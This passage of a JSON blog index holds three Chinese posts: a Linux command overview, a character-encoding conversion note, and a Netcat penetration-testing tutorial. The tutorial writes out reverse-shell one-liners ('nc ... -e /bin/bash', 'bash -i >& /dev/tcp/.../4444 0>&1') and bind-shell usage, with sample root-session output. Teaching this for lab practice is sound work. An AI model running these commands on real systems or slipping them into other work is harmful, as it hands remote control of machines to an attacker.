return","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Python/"}]},{"title":"Linux 常用命令","slug":"commands/Linux_command","date":"2017-07-09T11:34:12.000Z","updated":"2018-12-05T11:01:59.002Z","comments":true,"path":"2017/07/09/commands/Linux_command/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/07/09/commands/Linux_command/","excerpt":"本文将常用的Linux 命令按照功能划分从以下八个方面讲解: 1. 文件管理 2. 文件传输 3. 文档编辑 4. 磁盘管理 5. 磁盘维护 6. 网络通讯 7. 系统管理 8. 系统设置","text":"本文将常用的Linux 命令按照功能划分从以下八个方面讲解: 1. 文件管理 2. 文件传输 3. 文档编辑 4. 磁盘管理 5. 磁盘维护 6. 网络通讯 7. 系统管理 8. 系统设置 1. 文件管理 cat用法：cat [选项]… [文件]… 将[文件]或标准输入组合输出到标准输出。 tail tailftail : 默认将文件的末尾10行输出到标准输出中;tailf: 只显示新追加到文件的内容 等价于: tail -f cp用法：cp [选项]… [-T] 源文件 目标文件 或：cp [选项]… 源文件… 目录 或：cp [选项]… -t 目录 源文件…拷贝源文件 到目标地址， 可以选择多个源文件 mv用法：mv [选项]… [-T] 源文件 目标文件 或：mv [选项]… 源文件… 目录 或：mv [选项]… -t 目录 源文件…重命名源文件名为目标文件名, 或者是移动源文件到指定目录 rm用法：rm [选项]… 文件…移除 删除 文件; od用法：od [选项]… [文件]… 或：od [-abcdfilosx]… [文件] [[+]偏移量[.][b]] 或：od –traditional [选项]… [文件] [[+]偏移量[.][b] [+][标签][.][b]] 将指定文件以八进制形式(默认)转储到标准输出。如果指定了多于一个的文件参数，程序会自动将输入的内容整合为列表并以同样的形式输出。如果没有指定文件，或指定文件为”-“，程序从标准输入读取数据。 patchpatch 命令读取如何更改文件 的源文件指示信息，然后应用这些更改。源文件包含由 diff -c 或 -u 命令产生的差别列表（或者 diff 列表），以及一个或多个 diff 命令输出集（通常称为 hunks）。patch 结合差异的文件， 进行补全; diff 配合 patch: diff -ruN test1 test2 &gt; patch.log # 生成patch文件 patch test2 patch.log # 利用patch文件和patch命令打补丁 mkdir 用法：mkdir [选项]… 目录… 创建一个空的目录 rmdir用法：rm [选项]… 文件…删除一个空目录 chmod用法：chmod [选项]… 模式[,模式]… 文件… 或：chmod [选项]… 八进制模式 文件… 或：chmod [选项]… –reference=参考文件 文件…更改文件的属性: r w x chown 用法：chown [选项]… [所有者][:[组]] 文件… 或：chown [选项]… –reference=参考文件 文件… 更改文件的所属用户和所属组; whichUsage: /usr/bin/which [options] [–] COMMAND […]将命令的路径输出命令行界面; fileUsage: file [OPTION…] [FILE…]探测给定文件的类型 2. 文件传输 ftp scp rz/sz (串口) 3. 文档编辑 grep sort tr wc split sed awk 4. 磁盘管理 ls cd df du pwd tar tree find 5. 磁盘维护 dd fdisk mkfd mkswap sync 6. 网络通讯 ifconfig ip nc mesg ping netstat [ss] telnet traceroute route 7. 系统管理 date free kill ps last w whoami nice reboot shutdown su sudo top[htop] 8. 系统设置 alias [unlimit] set [unset] chkconfig service crontab at export passwd ulimit 参照: Linux Tools Quick Tutorial","categories":[{"name":"命令","slug":"命令","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"Netcat 网络攻击 以及 应用","slug":"kali/NetCat学习介绍","date":"2017-07-09T11:34:12.000Z","updated":"2018-11-19T16:06:11.571Z","comments":true,"path":"2017/07/09/kali/NetCat学习介绍/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/07/09/kali/NetCat学习介绍/","excerpt":"1.用Netcat进行黑客攻击第1部分：基础知识Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如： Banner抓取 原始连接 Web服务器交互","text":"1.用Netcat进行黑客攻击第1部分：基础知识Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如： Banner抓取 原始连接 Web服务器交互 1.1 Netcat Banner获取使用以下命令来获取服务器Banner（与服务建立原始连接）： nc [ip address] [port] 我们来试试这个在21端口运行的Metasploitable 2上的FTP服务： nc 192.168.1.100 21 nc [ip] [port]用于与端口进行原始连接，当可用时将返回服务器Banner。 code: rocky@kail: nc 23.105.202.xx 21 # 21 ftp 控制链接 220 (vsFTPd 2.2.2) # 系统服务 banner 1.2 Netcat原连接为了演示原始连接的工作原理，我们将在FTP服务连接到目标主机后发出一些FTP命令。 在匿名的情况下，我们来看看这个FTP服务器是否允许匿名访问，通过USER和PASS命令。 12345code: rocky@kail: nc 23.105.202.xx 21 220 (vsFTPd 2.2.2) user Postgres 331 Please specify the password. 1.3 Web服务器交互Netcat还可以通过发出HTTP请求与Web服务器进行交互。 通过以下命令，我们可以抓住在Metasploitable 2上运行的Web服务的Banner： nc 23.105.202.xx 80 然后运行此HTTP请求： HEAD / HTTP / 1.0 rocky@kail: nc 23.105.202.xx 80 HEAD / HTTP / 1.0 &lt;&lt; 输入 HTTP/1.1 400 Bad Request Server: nginx/1.12.0 Date: Sun, 28 May 2017 08:06:19 GMT Content-Type: text/html Content-Length: 173 Connection: close 1.4 使用Netcat进行文件传输 在这个例子中，我们将使用Netcat连接传输一个文本文件。假设我们在目标主机上执行远程命令，我们希望将文件从攻击主机传输到目标主机。首先，我们需要在目标主机上设置一个侦听器，并从攻击主机连接到它。我们将使用端口8080用于此目的，我们将该文件安全保存到桌面: 1nc -lvp 8080&gt; 1.txt 在攻击主机上，我们连接到8080端口并发送文件名称transfer.txt： 1nc 192.168.100.107 8080 &lt; 1.txt 2 用Netcat进行黑客攻击第2部分：绑定和反向shellNetcat反向reverse shell 在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。 在下面的内容中我们将展示使用bind shell和reverse shell。下面将使用4444端口，但请注意，这可以是任何开放端口。实际上，通常您需要使用更常见的端口，如80和443来设置反向shell，因为这些端口是更常见的打开。 NC reverse shell 工作原理: 12攻击主机A执行: nc -lvp 4444 ; 监听被攻击者链接 12被攻击主机B执行: nc xxx.xxx.xxx.xxx 4444 -e /bin/bash ; 将bash shell 权限提供给攻击者 实现控制权限的转移; 实现通信后: 在攻击主机A上执行命令，即可操作被攻击者B 缺点: 此时被攻击者B 需要使用Netcat命令， 而且普通 GNU Linux nc 并没有 -e { -e filename program to exec after connect [dangerous]} 参数; 顾此种反向链接并不适用; 2.1 使用Bash 来代替Nc实现反向链接;12被攻击主机B: bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 12攻击者A: nc -lvp 4444 1234567891011A机代码:[root@virtualS ~]# nc -lvp 4444Connection from 111.15.33.114:17835 ## 此时B机执行转移指令 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~# ididuid=0(root) gid=0(root) groups=0(root)root@kailvirtual:~# 1234567891011 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 命令解释: bash: -i if the -i option is present, the shell is interactive shell: 0/1/2 分别代表Linux标准输入，输出，异常 即 C编程中的 stdin, stdout, stderr 0&gt;&amp;1 指 将标准输入完全输出到标准输出中; 采用&amp;可以将 0/1 绑定在一起。这条命令的作用标准输入将和标准输出同用一个文件描述符，说人话就是错误输入将会和标准输出输出到同一个地方。 2.2 Netcat正向bind Shellbind shell是一个绑定到目标主机上的特定端口以监听即将到来的连接的shell。我们来看看一个Netcat正向bind shell的原理: 123456789攻击主机A: rocky@mac: nc 192.168.1.9 4444 id uid=0(root) gid=0(root) groups=0(root) echo $HOSTNAME kailvirtual 相同点: 我们都需要被攻击者将其shell控制权限交给我们 将shell command 以数据流的形式重定向到被攻击主机的Bash shell中; 更多Nc 学习参照链接","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"渗透","slug":"渗透","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/渗透/"},{"name":"Kali","slug":"Kali","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kali/"}]},{"title":"Linux 字符编码 查看与转换","slug":"commands/Linux_encoding","date":"2017-07-09T11:34:12.000Z","updated":"2018-12-05T11:02:09.257Z","comments":true,"path":"2017/07/09/commands/Linux_encoding/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/07/09/commands/Linux_encoding/","excerpt":"不同操作系统之间的换行表现形式不同需要常用编码转化 以及 文件转码;","text":"不同操作系统之间的换行表现形式不同需要常用编码转化 以及 文件转码; Linux 查看文件编码格式 Vim 查看文件编码 1set fileencoding // 即可显示文件编码格式 若想解决Vim查看文件乱码问题， 可以在 .vimrc 文件添加 1set encoding=utf-8 fileencoding=utf-8, cp936,gb2312 等 enca (yum install enca) 查看文件编码 1enca filename // enca对某些GBK编码文件并不识别 Unrecognized encoding 文件编码转化 Vim直接转化文件编码1set fileencoding=utf-8 iconv 1iconv -f encoding -t encoding inputfile 例如: 将一个utf-8 编码转化为GBK编码 1iconv -f utf-8 -t gbk file -o file2 1234567891011121314151617181920iconv命令用于转换指定文件的编码,默认输出到标准输出设备,亦可指定输出文件。 用法： iconv [选项...] [文件...] 有如下选项可用: 输入/输出格式规范： -f, --from-code=名称 原始文本编码 -t, --to-code=名称 输出编码 信息： -l, --list 列举所有已知的字符集 输出控制： -c 从输出中忽略无效的字符 -o, --output=FILE 输出文件 -s, --silent 关闭警告 --verbose 打印进度信息 -?, --help 给出该系统求助列表 --usage 给出简要的用法信息 -V, --version 打印程序版本号 例子: iconv -f utf-8 -t gb2312 aaa.txt &gt;bbb.txt 这个命令读取aaa.txt文件，从utf-8编码转换为gb2312编码,其输出定向到bbb.txt文件。 enconv将一个GBK编码转化为 utf-8编码 1enconv -L zh_CN -x utf-8 filename dos2unix : window 文件 cpoy 到 linux 格式转化 DOS下的文本文件是以\\r\\n作为断行标志的 Mac文本是以 \\r 作为换行标志 Linux文本以 \\n 作为换行标志 1dos2unix filename","categories":[{"name":"命令","slug":"命令","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"},{"name":"Vim","slug":"Vim","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Vim/"}]}]}